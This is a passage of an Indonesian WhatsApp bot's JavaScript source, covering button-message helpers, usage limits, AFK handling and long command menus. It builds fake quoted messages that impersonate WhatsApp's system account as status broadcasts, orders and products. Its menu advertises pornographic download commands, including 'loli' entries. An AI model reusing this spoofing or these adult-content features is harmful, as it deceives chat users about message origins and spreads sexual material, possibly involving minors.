		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const troli =  {key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 300, status: 200, thumbnail: fakeimage, surface: 200, message: fake, orderTitle: 'dha', sellerJid: '0@s.whatsapp.net'} } }
        const ftext = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `*Hai ${pushname}👋*\n  ${moment().utcOffset('+0700').format('HH:mm:ss')} ${moment.tz('Asia/Jakarta').format('DD/MM/YYYY')}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./media/ganteng.jpg')}}}
        const ftoko = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./media/ganteng.jpg`)},"title": `HALLO...${pushname}JANGAN LUPA DI ORDER`,"description": "Katashi KANG TOLOL", "currencyCode": "IDR","priceAmount1000": "999999","retailerId": "Katashi-Botz","productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}

      const sendButImage = async (
      id,
      text1,
      desc1,
      gam1,
      but = [],
      options = {}
    ) => {
      kma = gam1;
      mhan = await dha.prepareMessage(from, kma, image);
      const buttonMessages = {
        imageMessage: mhan.message.imageMessage,
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 4,
      };
      dha.sendMessage(
        id,
        buttonMessages,
        MessageType.buttonsMessage,
        options
      );
    };
    const sendButVideo = async (
      id,
      text1,
      desc1,
      vid1,
      but = [],
      options = {}
    ) => {
      kma = vid1;
      mhan = await dha.prepareMessage(from, kma, video);
      const buttonMessages = {
        videoMessage: mhan.message.videoMessage,
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 5,
      };
      dha.sendMessage(
        id,
        buttonMessages,
        MessageType.buttonsMessage,
        options
      );
    };

///Limit2
const checkLimit = (sender) => {
			let found = false
			for (let lmt of _limit) {
			if (lmt.id === sender) {
			let limitCounts = limitt - lmt.limit
			if (limitCounts <= 0) return dha.sendMessage(from,`Limit request anda sudah habis\n`, text, { quoted: mek})
			dha.sendMessage(from, `limit anda : ${limitCounts}`, text, { quoted : mek})
			found = true 
			}
		}
			if (found === false) {
			let obj = { id: sender, limit: 0 }
			_limit.push(obj)
			fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
			dha.sendMessage(from, `limit anda : ${limitCounts}`, text, { quoted : mek})
			}
		} 
			
			//funtion limited
const isLimit = (sender) =>{ 
			if (isOwner && isPremium) {return false;}
			let position = false
			for (let i of _limit) {
			if (i.id === sender) {
			let limits = i.limit
			if (limits >= limitt ) {
			position = true
			reply('*Limit Anda Sudah Habis*')
			return true 
			} else {
			_limit
			position = true
			return false 
			}
		}
	}
			if (position === false) {
const obj = { id: sender, limit: 0 }
			_limit.push(obj)
			fs.writeFileSync('./database/limit.json',JSON.stringify(_limit))
			return false 
			}
		}


      // Anti link
        
let {
    banChats,
} = setting

function banChat() {
    if (banChats == true) {
        return false
    } else {
        return true
    }
}
             
        // MUTE
             
        
// AFK
	if (isGroup) {
		if (!mek.key.fromMe && mek.key.fromMe) return
		for (let x of mentionUser) {
		    if (afk.checkAfkUser(x, _afk)) {
			const getId = afk.getAfkId(x, _afk)
			const getReason = afk.getAfkReason(getId, _afk)
			const getTime = afk.getAfkTime(getId, _afk)
			const cptl = `*「 AFK MODE 」*\n
*Sssttt! Orangnya lagi AFK, jangan diganggu!*
➸ *Alasan*  : ${getReason}
➸ *Sejak* : ${getTime}`
      mentions(cptl, x, true)
    }}
		if (afk.checkAfkUser(sender, _afk) && !isCmd) {
		    const getTime = afk.getAfkTime(sender, _afk)
		    const getReason = afk.getAfkReason(sender, _afk)
		    const ittung = ms(await Date.now() - getTime)
		    const pep = `*${pushname}* telah kembali dari AFK! Selamat datang kembali~`
		    reply(pep)
		    _afk.splice(afk.getAfkPosition(sender, _afk), 1)
		    fs.writeFileSync('./database/user/afk.json', JSON.stringify(_afk))
		}
	    }
	
	    // Auto Read
        dha.chatRead(from, "read")
        //auto vn 
        await dha.updatePresence(from, Presence.recording)


       // CMD
        if (isCmd && !isGroup)
		    atm.addKoinUser(sender, randomNomor(20), _uang)
            console.log(color('[ PRIV ]'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
        
        if (isCmd && isGroup)
            atm.addKoinUser(sender, randomNomor(20), _uang)
            console.log(color('[ GC ]'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
            

            switch(command){
            	
            
           
 case 'donasi':
               txtt =`Hai Kak.....\n*${pushname}*\nMAU DONASI PILIH SALAH SATU`

               buttons = [{buttonId: '!dana',buttonText:{displayText: 'DANA'},type:1},{buttonId:'!gopay',buttonText:{displayText:'GOPAY'},type:1},{buttonId:'!pulsa',buttonText:{displayText:'PULSA'},type:1}]

               buttonsMessage = {
               contentText: `${txtt}`,
               footerText: 'DONASI MU SANGAT BERHARGA BAGI KAMI',
               buttons: buttons,
               headerType: 1
}

               prep = await dha.prepareMessageFromContent(from,{buttonsMessage},{})
               dha.relayWAMessage(prep)
               
break 
        case 'owner':
        case 'creator':
               sendKontak(from, `${owner}`, `${ownerName}`, 'Sibukk!!')
               await sleep(1000)
               txtt =`Hai Kak..... ${pushname}\nItu Ownerku, Mau tau soal apa ya?`

               buttons = [{buttonId: '!youtube',buttonText:{displayText: 'YOUTUBE'},type:1},{buttonId:'!infoig',buttonText:{displayText:'INSTAGRAM'},type:1}]

               buttonsMessage = {
               contentText: `${txtt}`,
               footerText: 'Jangan Sungkan Chat Ya Kak',
               buttons: buttons,
               headerType: 1
}

               prep = await dha.prepareMessageFromContent(from,{buttonsMessage},{})
               dha.relayWAMessage(prep)
               
break      
               const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await dha.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
dha.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}

        case 'menu2':
        case 'allmenu':
        case 'help2':
        
        sticWait(from)
        
					        
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
        menu =`Hai Kak.....\n*${pushname}*\n\`\`\`Saya Sanz Bot,SENANG BISA BERTEMU DENGANMU HARI INI\`\`\`
╭─❒ 「 Bot Info 」 ❒
│◦➛NAMA : *Sanz Bot*
│◦➛API : @6281932664252
│◦➛OWNER : *Rimuru*
│◦➛AKTIF : *${runtime(process.uptime())}*
│◦➛TOTAL HIT : *${totalhit} Hit*
│◦➛HIT TODAY : *${hit_today.length} Hit*
│◦➛PREIFIX : *『${prefix}』*
│◦➛BATERAI : *${baterai}%*
└❏ - Sanz Bot

╭─❒ 「 Developer 」 ❒
│◦➛NAMA : *Chairul Putra*
│◦➛OWNER : https://wa.me/6281932664252
│◦➛SUBREK YT : https://youtube.com/channel/UCqD3xkdZA3odZZ7LT3oSaWA
│◦➛BOT VERSI : 1.1.2
└❏ - Sanz Bot

╭─❒ 「 User Info 」 
│◦➛Status : ${isOwner ? 'Owner' : 'User'}
│◦➛Premium : ${isPremium ? 'Yes' : 'No'}
│◦➛Nama : ${pushname}
│◦➛Api : *@${sender.split('@')[0]}*
└❏ - Sanz Bot

┌❏ INDONESIA TIME
│◦➛Wib: *${moment().utcOffset('+0700').format('HH:mm')}* WIB 
│◦➛Wita: *${moment().utcOffset('+0800').format('HH:mm')}* WITA 
│◦➛Wt: *${moment().utcOffset('+0900').format('HH:mm')}* WIT
└❏ - Sanz Bot
   ━━━━━ 𝗔𝗟𝗟 𝗠𝗘𝗡𝗨 ━━━━━

╭──────❲ FITUR❳
│• ${prefix}donate
│• ${prefix}donasi
│
├──❲ Info ❳
│◦➛${prefix}update
│◦➛${prefix}iklan
│◦➛${prefix}level
│◦➛${prefix}rules
│◦➛${prefix}waktu
│◦➛${prefix}botstat
│◦➛${prefix}owner
│◦➛${prefix}ping
│◦➛${prefix}donasi
│◦➛${prefix}report [ keluhan ]
│◦➛${prefix}belipremium
│
├──❲ Group ❳
│◦➛* ${prefix}groupsetting*
│◦➛* ${prefix}getbio* _reply_
│◦➛* ${prefix}afk* _alasan_
│◦➛* ${prefix}kontak* _nomor|nama_
│◦➛* ${prefix}kickall*
│◦➛* ${prefix}infogrup*
│◦➛* ${prefix}promoteall*
│◦➛* ${prefix}demoteall*
│◦➛* ${prefix}listonline*
│◦➛* ${prefix}tagall* _teks_
│◦➛* ${prefix}leave*
│◦➛* ${prefix}kick* _reply_
│◦➛* ${prefix}add* _628xxx_
│◦➛* ${prefix}setnamegc*
│◦➛* ${prefix}setppgc*
│◦➛* ${prefix}getpp*
│◦➛* ${prefix}setdeskgc*
│◦➛* ${prefix}sider* _reply chat bot_
│◦➛* ${prefix}hidetag* _teks/reply teks_
│◦➛* ${prefix}linkgc*
│◦➛* ${prefix}getdeskgc*
│◦➛* ${prefix}revoke*
│◦➛* ${prefix}reminder* _text/waktu
│◦➛* ${prefix}promote* _tag orang_
│◦➛* ${prefix}demote* _tag orang_
│◦➛* ${prefix}tagme* 
│◦➛* ${prefix}antilinktelegram* _1/0_
│◦➛* ${prefix}antilinkyoutube-v* _1/0_
│◦➛* ${prefix}antilinkyoutube-c* _1/0_
│
├──❲ Download ❳
│◦➛* ${prefix}tiktok*
│◦➛* ${prefix}play*
│◦➛* ${prefix}ythd*
│◦➛* ${prefix}ytmp3*
│◦➛* ${prefix}ytmp4*
│◦➛* ${prefix}soundcloud*
│◦➛* ${prefix}tiktoknowm*
│◦➛* ${prefix}tiktokaudio*
│◦➛* ${prefix}mediafire*
│◦➛* ${prefix}ytmp42 <query>*
│◦➛* ${prefix}tiktok <query>*
│◦➛* ${prefix}jooxplay <query>*
│◦➛* ${prefix}tts* _kode|text_
│◦➛* ${prefix}pinterest* _text_
│◦➛*${prefix}splay* _text_
│◦➛* ${prefix}ssweb* _Linknya_
│◦➛* ${prefix}igvideo* _Linknya_
│◦➛* ${prefix}randomtiktok* 
│◦➛* ${prefix}tiktoksearch* _Text_
│◦➛* ${prefix}instagram* _Linkny_
│◦➛* ${prefix}ytmp4dh* _Linkny_
│
├──❲ Game ❳
│◦➛* ${prefix}slot*
│◦➛* ${prefix}tictactoe* _@tag_
│◦➛* ${prefix}suit* _batu/kertas/gunting_
│
├──❲ Asupan ❳
│◦➛* ${prefix}asupanmenu* 
│
├──❲ Text ❳
│◦➛* ${prefix}style (text)
│◦➛* ${prefix}pastebin (text)
│◦➛* ${prefix}nickepep
│◦➛* ${prefix}fake
│◦➛* ${prefix}twich
│◦➛* ${prefix}cersex
│◦➛* ${prefix}cerpen
│◦➛* ${prefix}katacinta
│◦➛* ${prefix}tongue
│◦➛* ${prefix}renungan
│◦➛* ${prefix}randomcerpen
│◦➛* ${prefix}quotes* 
│◦➛* ${prefix}faktaunik
│◦➛* ${prefix}cerpencinta* 
│◦➛*${prefix}artinama* _text_
│◦➛*${prefix}randomnama* _gender_
│◦➛* ${prefix}cerpenhoror* 
│◦➛* ${prefix}katajago* _Cari Apa?_
│
├──❲ Dewasa ❳
│◦➛* ${prefix}randombokep _Premuser_
│◦➛* ${prefix}nhentaizip* _code_*
│◦➛* ${prefix}xvideo _Link_* _Premuser_
│◦➛* ${prefix}xs _Text_* _Premuser_
│◦➛* ${prefix}xs2 _Text_* _Premuser_
│◦➛* ${prefix}xnxx _Link_* _Premuser_
│◦➛* ${prefix}randomporn* _Premuser_
│◦➛*${prefix}hentaivideo* _Premuser_
│◦➛* ${prefix}bokep* _Owner_
│◦➛* ${prefix}hentai*
│◦➛* ${prefix}nhentai* text
│◦➛* ${prefix}doujin* _text_
│◦➛* ${prefix}ahegao*
│◦➛* ${prefix}bdsm*
│◦➛* ${prefix}blowjob*
│◦➛* ${prefix}cuckold*
│◦➛* ${prefix}cum*
│◦➛* ${prefix}ero*
│◦➛* ${prefix}foot*
│◦➛* ${prefix}ass*
│◦➛* ${prefix}fembom*
│◦➛* ${prefix}gangbang*
│◦➛* ${prefix}glasses*
│◦➛* ${prefix}jahy*
│◦➛* ${prefix}masturbate*
│◦➛* ${prefix}nsfwneko*
│◦➛* ${prefix}orgy*
│◦➛* ${prefix}panties*
│◦➛* ${prefix}pussy*
│◦➛* ${prefix}nekopoi* _Premuser_
│◦➛* ${prefix}nekopoisearch* _Premuser_
│◦➛* ${prefix}nekopoilatest* _Premuser_
│
├──❲ Image ❳
│◦➛* ${prefix}narutobanner
│◦➛* ${prefix}aesthetic
│◦➛* ${prefix}bts
│◦➛* ${prefix}blackpink
│◦➛* ${prefix}ppcp
│◦➛* ${prefix}pinterest* _text_
│◦➛* ${prefix}meme* -Fix bug
│◦➛* ${prefix}darkjokes* -Fix bug
│◦➛* ${prefix}memes* -Fix bug
│◦➛* ${prefix}kucing* 
│◦➛* ${prefix}quotimg* 
│
├──❲ Stiker ❳
│◦➛* ${prefix}dadu*
│◦➛* ${prefix}doge*
│◦➛* ${prefix}patrick*
│◦➛* ${prefix}gura*
│◦➛* ${prefix}stickeranime*
│◦➛* ${prefix}stcmeme* _teks|teks_
│◦➛* ${prefix}swm* _pack|author_
│◦➛* ${prefix}take* _pack|author_
│◦➛* ${prefix}caristicker* _text_
│◦➛* ${prefix}attp* _text_
│◦➛* ${prefix}ttp* _text_
│◦➛* ${prefix}ttpyellow* _text_
│◦➛* ${prefix}ttpblue* _text_
│
├──❲ Tols ❳
│◦➛* ${prefix}toimg*
│◦➛* ${prefix}tovideo*
│◦➛* ${prefix}tomp3*
│◦➛* ${prefix}tourl*
│◦➛* ${prefix}urlshort*
│◦➛* ${prefix}urlshort2*
│◦➛* ${prefix}tupai* _reply suaranya_
│◦➛* ${prefix}vibra* _reply suaranya_
│◦➛* ${prefix}gemuk* _reply suaranya_
│◦➛* ${prefix}robot* _reply suaranya_
│◦➛* ${prefix}bass* _reply suaranya_
│◦➛* ${prefix}balik* _reply suaranya_
│
├──❲ Maker ❳
│◦➛* ${prefix}wasted*
│◦➛* ${prefix}squidrip*
│◦➛* ${prefix}wanted*
│◦➛* ${prefix}deltrash*
│◦➛* ${prefix}barkodemaker* _text_
│◦➛* ${prefix}removebg* _tag stikernya_
│◦➛* ${prefix}sepia*
│◦➛* ${prefix}rainbow*
│◦➛* ${prefix}wasted*
│◦➛* ${prefix}blurple2*
│◦➛* ${prefix}blurple*
│◦➛* ${prefix}red*
│◦➛* ${prefix}invert_greyscale*
│◦➛* ${prefix}invert*
│◦➛* ${prefix}greyscale*
│◦➛* ${prefix}biru*
│◦➛* ${prefix}comrade*
│◦➛* ${prefix}jail*
│◦➛* ${prefix}passed*
│◦➛* ${prefix}glass*
│◦➛* ${prefix}gay*
│◦➛* ${prefix}sampah*
│◦➛* ${prefix}trigger*
│
├──❲ Informasi ❳
│◦➛* ${prefix}cuacabandara
│◦➛* ${prefix}cuaca1 <_Nama Daerah_>
│◦➛* ${prefix}cuaca <_Nama Daerah>
│◦➛* ${prefix}rscovid
│◦➛* ${prefix}jadwalbola 
│◦➛* ${prefix}jadwaltvnow 
│◦➛* ${prefix}trendingtwitter*
│◦➛* ${prefix}mostviewfilm*
│◦➛* ${prefix}infoloker*
│◦➛* ${prefix}datasekolah <query>*
│◦➛* ${prefix}datasekolah2 <query>*
│◦➛* ${prefix}infogempa <query>*
│◦➛* ${prefix}jamdunia* 
│
├──❲ Edukasi ❳
│◦➛* ${prefix}nulis
│◦➛* ${prefix}kubik _Angkanya_
│◦➛* ${prefix}kuadrat _Angkanya_
│
├──❲ Database ❳
│◦➛* ${prefix}addvn*
│◦➛* ${prefix}listvn*
│◦➛* ${prefix}getvn*
│◦➛* ${prefix}addimg*
│◦➛* ${prefix}listimg*
│◦➛* ${prefix}getimg*
│◦➛* ${prefix}addvid*
│◦➛* ${prefix}listvid*
│◦➛* ${prefix}getvid*
│◦➛* ${prefix}addstik*
│◦➛* ${prefix}liststik*
│◦➛* ${prefix}getstik*
│◦➛* ${prefix}addcmd*
│◦➛* ${prefix}listcmd*
│◦➛* ${prefix}delcmd*
│
├──❲ Anime ❳
│◦➛* ${prefix}addvn*
│◦➛* ${prefix}loli*
│◦➛* ${prefix}manga*
│◦➛* ${prefix}anime*
│◦➛* ${prefix}lolivideo*
│◦➛* ${prefix}husbu*
│◦➛* ${prefix}milf*
│◦➛* ${prefix}neko*
│◦➛* ${prefix}kanna*
│◦➛* ${prefix}sagiri*
│◦➛* ${prefix}cosplay*
│◦➛* ${prefix}wallnime*
│◦➛* ${prefix}kusonime*
│◦➛* ${prefix}megumin*
│◦➛* ${prefix}otakudesu*
│◦➛* ${prefix}otakuongoing*
│◦➛* ${prefix}neko*
│◦➛* ${prefix}gura*
│◦➛* ${prefix}kaneki*
│◦➛* ${prefix}lolim*
│◦➛* ${prefix}remm*
│◦➛* ${prefix}vanpire*
│◦➛* ${prefix}cosplay2* 
│◦➛* ${prefix}waifu*
│◦➛* ${prefix}anoboys* _Cari Apa?_
│◦➛* ${prefix}dewabatch* _Cari Apa?_
│
├──❲ Bercanda/Kesenangan ❳
│◦➛* ${prefix}cekwatak*
│◦➛* ${prefix}cekmati* _nama_
│◦➛* ${prefix}wangy* _nama_
│◦➛* ${prefix}shrek* _nama_
│◦➛* ${prefix}nenen* _nama_
│◦➛* ${prefix}wangy2* _nama_
│◦➛* ${prefix}simp* _nama_
│◦➛* ${prefix}citacita*
│◦➛* ${prefix}toxic*
│◦➛* ${prefix}truth*
│◦➛* ${prefix}dare*
│◦➛* ${prefix}apakah*
│◦➛* ${prefix}bisakah*
│◦➛* ${prefix}kapankah*
│◦➛* ${prefix}rate*
│◦➛* ${prefix}jadian*
│◦➛* ${prefix}cantik*
│◦➛* ${prefix}ganteng*
│◦➛* ${prefix}beban*
│◦➛* ${prefix}babi*
│◦➛* ${prefix}cekganteng*
│◦➛* ${prefix}cekcantik*
│◦➛* ${prefix}katashi _Text_
│◦➛* ${prefix}putra _Text_
│◦➛* ${prefix}simi _Text_
│◦➛* ${prefix}asupan* _product_* 
│◦➛* ${prefix}tts* _text_
│◦➛* ${prefix}randomtiktok* 
│◦➛* ${prefix}tiktoksearch* _Text_
│◦➛* ${prefix}santet* 
│◦➛* ${prefix}kutuk* 
│
├──❲ Pencarian ❳
│◦➛* ${prefix}ytsearch* _query_
│◦➛* ${prefix}shopee* _product_
│◦➛* ${prefix}playstore* _query_
│◦➛* ${prefix}google* _query_
│◦➛* ${prefix}image* _query_
│◦➛* ${prefix}ytsearch <query>
│◦➛* ${prefix}carimasakna _masakanya_
│◦➛* ${prefix}thelazy _Text_
│◦➛* ${prefix}palingmurah (text)
│◦➛* ${prefix}sfilesearch (text)
│◦➛* ${prefix}ytstalk (channel)
│◦➛* ${prefix}happymod <text>
│◦➛* ${prefix}film <text>
│◦➛* ${prefix}ytplaylist <text>
│◦➛* ${prefix}ytchannel <text> 
│◦➛* ${prefix}jav (text)
│◦➛* ${prefix}phsearch (text)
│◦➛* ${prefix}chord _Text_
│◦➛* ${prefix}nekopoirandom
│◦➛* ${prefix}nekopoisearch
│◦➛* ${prefix}ytstalk _Text_ 
│◦➛* ${prefix}jooxsearch <query>
│◦➛* ${prefix}pesantren <id>
│◦➛* ${prefix}kabupaten <id>
│◦➛* ${prefix}provinsi 
│◦➛* ${prefix}kusonime <query>
│◦➛* ${prefix}samehadaku <query>
│◦➛* ${prefix}dafontsearch <query>
│◦➛* ${prefix}jarak <query>
│◦➛* ${prefix}nhentaisearch <query>
│◦➛* ${prefix}komiku <query>
│◦➛* ${prefix}doujin* _text_
│◦➛* ${prefix}caribioskop* _lokaskinya_
│◦➛* ${prefix}appstore* _Apknya_
│◦➛* ${prefix}ytsearch* _Text_ -Fix bug
│◦➛* ${prefix}searchgroup* _Text_ -Fix bug
│◦➛* ${prefix}drakorlatest* 
│◦➛* ${prefix}drakor* _Cari Apa?_
│◦➛* ${prefix}webtoons* _Cari Apa?_
│◦➛* ${prefix}layarkaca* _Cari Apa?_
│◦➛* ${prefix}jobs* _Cari Apa?_
│◦➛* ${prefix}wattpad* _Cari Apa?_
│◦➛* ${prefix}amazon* _Cari Apa?_
│◦➛* ${prefix}cariresep* _Cari Apa?_
│
├──❲ Owner ❳
│◦➛* ${prefix}bc* _teks_
│◦➛* ${prefix}tobc* _audio_
│◦➛* ${prefix}term*
│◦➛* ${prefix}eval*
│◦➛* ${prefix}clearall*
│◦➛* ${prefix}leaveall*
│◦➛* ${prefix}join* _teks_
│◦➛* ${prefix}shutdown*
│◦➛* ${prefix}getquoted*
│◦➛* ${prefix}addupdate* _fiturnya_
│◦➛* ${prefix}exif* _nama|author_
│◦➛* ${prefix}setpp*
│◦➛* ${prefix}setbio*
│◦➛* ${prefix}setname*
│◦➛* ${prefix}getpp*
│◦➛* ${prefix}sharelock*
│◦➛* ${prefix}chat* _nomor|teks_*
│◦➛* ${prefix}listptrem* _text_
│◦➛* ${prefix}addprem* member
│◦➛* ${prefix}delprem* member
│◦➛* ${prefix}clearall*
│◦➛* ${prefix}delchat*
│◦➛* ${prefix}unarchiveall*
│◦➛* ${prefix}readall*
│◦➛* ${prefix}unreadall*
│◦➛* ${prefix}archive*
│◦➛* ${prefix}unpin*
│
├──❲ Other ❳
│◦➛* ${prefix}tourl*
│◦➛* ${prefix}tinyurl*
│◦➛* ${prefix}bilamgangka*
│◦➛* ${prefix}artimimpi*
│◦➛* ${prefix}cariresep*
│◦➛* ${prefix}urlshort _Link_
│◦➛* ${prefix}urlshort2 _Text_
│◦➛* ${prefix}brainly <query>
│◦➛* ${prefix}image <query>
│◦➛* ${prefix}anime <random>
│◦➛* ${prefix}pinterest <query>
│◦➛* ${prefix}komiku <query>
│◦➛* ${prefix}lirik <query>
│◦➛* ${prefix}chara <query>
│◦➛* ${prefix}playstore <query>
│◦➛* ${prefix}otaku <query>
│◦➛* ${prefix}renungan
│◦➛* ${prefix}animeindo (text)
│◦➛* ${prefix}kodepos2 (text) 
│◦➛* ${prefix}gabut 
│◦➛* ${prefix}darkjoke*
│◦➛* ${prefix}tts* _text_
│◦➛* ${prefix}translate2* _kode|text_
│◦➛* ${prefix}bahasa* 
│◦➛* ${prefix}linkwa* _text_
│◦➛* ${prefix}quot*
│◦➛* ${prefix}igstalk* _usernamenya_
│◦➛* ${prefix}wikipedia _Nyari apa?_*
│◦➛* ${prefix}sharelock* test|fitur
╰────────────────⊱
#- *List Kode Bahasa Untuk Fitur tts id*

  af: Afrikaans,
  sq: Albanian,
  ar: Arabic,
  hy: Armenian,
  ca: Catalan,
  zh: Chinese,
  zh-cn: Chinese (Mandarin/China),
  zh-tw: Chinese (Mandarin/Taiwan),
  zh-yue: Chinese (Cantonese),
  hr: Croatian,
  cs: Czech,
  da: Danish,
  nl: Dutch,
  en: English,
  en-au: English (Australia),
  en-uk: English (United Kingdom),
  en-us: English (United States),
  eo: Esperanto,
  fi: Finnish,
  fr: French,
  de: German,
  el: Greek,
  ht: Haitian Creole,
  hi: Hindi,
  hu: Hungarian,
  is: Icelandic,
  id: Indonesian,
  it: Italian,
  ja: Japanese,
  ko: Korean,
  la: Latin,
  lv: Latvian,
  mk: Macedonian,
  no: Norwegian,
  pl: Polish,
  pt: Portuguese,
  pt-br: Portuguese (Brazil),
  ro: Romanian,
  ru: Russian,
  sr: Serbian,
  sk: Slovak,
  es: Spanish,
  es-es: Spanish (Spain),
  es-us: Spanish (United States),
  sw: Swahili,
  sv: Swedish,
  ta: Tamil,
  th: Thai,
  tr: Turkish,
  vi: Vietnamese,
  cy: Welsh
  
  Ketik /tts _Kode Bahasa_ _Text_
  contoh /tts id Putra Ganteng -#

©𝑪𝒓𝒆𝒂𝒕𝒐𝒓 ©Katashi`
               buttons = [{buttonId: `${prefix}menu`,buttonText:{displayText: '𝗔𝗟𝗟 𝗠𝗘𝗡𝗨'},type:1},{buttonId: `${prefix}grupbot`,buttonText:{displayText: '𝗥𝗨𝗟𝗘𝗦'},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'OWNER'},type:1}]

               imageMsg = (await dha.prepareMessageMedia(fs.readFileSync(`./media/ganteng.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/canss.jpg`)})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText: '\`\`\`MAU BELI SC INI HUBUNGIN Katashi WA 6281932664252\`\`\`', imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}

               prep = await dha.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
              dha.relayWAMessage(prep)
                
break

        case 'menu':
        case 'help':
        
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
        get_result = await fetchJson(`https://vaksincovid19-api.vercel.app/api/vaksin`)
                    Total = `Total Sasaran : ${get_result.totalsasaran}`
        
        groups = dha.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = dha.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await dha.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
              
              const d = new Date(new Date + 3600000)
              
              const locale = 'id'
              
               dateIslamic = Intl.DateTimeFormat(locale + '-TN-u-ca-islamic', {
      
            day: 'numeric',
      
            month: 'long',
      
            year: 'numeric'
    
            }).format(d)

        
        
        menu =`Hai Kak.....\n*${pushname}*\n\`\`\`Saya Sanz Bot,SENANG BISA BERTEMU DENGANMU HARI INI\`\`\`
╭─❒ 「 Bot Info 」 ❒
│◦➛NAMA : *Sanz Bot*
│◦➛API : @6281932664252
│◦➛OWNER : *Rimuru*
│◦➛AKTIF : *${runtime(process.uptime())}*
│◦➛TOTAL HIT : *${totalhit} Hit*
│◦➛HIT TODAY : *${hit_today.length} Hit*
│◦➛PREIFIX : *『${prefix}』*
│◦➛BATERAI : *${baterai}% ${charger}*
│◦➛RAM USAGE : *${ram2}*
│◦➛PLATFORM : *${os.platform()}*
│◦➛HOSTNAME : *${os.hostname()}*
│◦➛🗓️ISLAM : *${dateIslamic}*
│◦➛UPTIME : *${runtime(process.uptime())}*
│◦➛SPEED : *${latensie.toFixed(4)} _Second_*
│◦➛CHAT : *${totalChat.length}*
└❏ - Sanz Bot

╭─❒ 「 User Info 」 
│◦➛Status : ${isOwner ? 'Owner' : 'User'}
│◦➛Premium : ${isPremium ? 'Yes' : 'No'}
│◦➛Nama : ${pushname}
│◦➛Api : *@${sender.split('@')[0]}*
└❏ - Sanz Bot

┌❏ INDONESIA TIME
│◦➛Wib: *${moment().utcOffset('+0700').format('HH:mm')}* WIB 
│◦➛Wita: *${moment().utcOffset('+0800').format('HH:mm')}* WITA 
│◦➛Wt: *${moment().utcOffset('+0900').format('HH:mm')}* WIT
└❏ - Sanz Bot

┌❏ INFO VAKSIN
│◦➛${Total}
└❏ - Sanz Bot


©𝑪𝒓𝒆𝒂𝒕𝒐𝒓 ©Katashi`
               buttons = [{buttonId: `${prefix}menu2`,buttonText:{displayText: '𝗔𝗟𝗟 𝗠𝗘𝗡𝗨'},type:1},{buttonId: `${prefix}grupbot`,buttonText:{displayText: '𝗥𝗨𝗟𝗘𝗦'},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'OWNER'},type:1}]

               imageMsg = (await dha.prepareMessageMedia(fs.readFileSync(`./media/ganteng.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/canss.jpg`)})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText: '\`\`\`MAU BELI SC INI HUBUNGIN Katashi WA 6281932664252\`\`\`', imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}

               prep = await dha.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
              dha.relayWAMessage(prep)
              
break
       
//------------------< Game >------------------- 
       
        case 'delsesittt':
        case 'resetgame':
               if (!isGroup) return reply(mess.only.group)
               if (!isTTT) return reply('Tidak Ada Permainan Di Grub Ini')
               naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
               ky_ttt = naa 
               reply('Sukses Mereset Game')
              await limitAdd(sender)
break
        case 'tictactoe':
        case 'ttt':
        sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              if (!isGroup) return reply(mess.only.group)
              if (args.length < 1) return reply('Tag Lawan Anda! ')
              if (isTTT) return reply('Sedang Ada Permainan Di Grub Ini, Harap Tunggu')
              if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target Lawan!')
              ment = mek.message.extendedTextMessage.contextInfo.mentionedJid
              player1 = sender
              player2 = ment[0]
              angka = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
              id = from
              gilir = player2
              ky_ttt.push({player1,player2,id,angka,gilir})
              dha.sendMessage(from, 
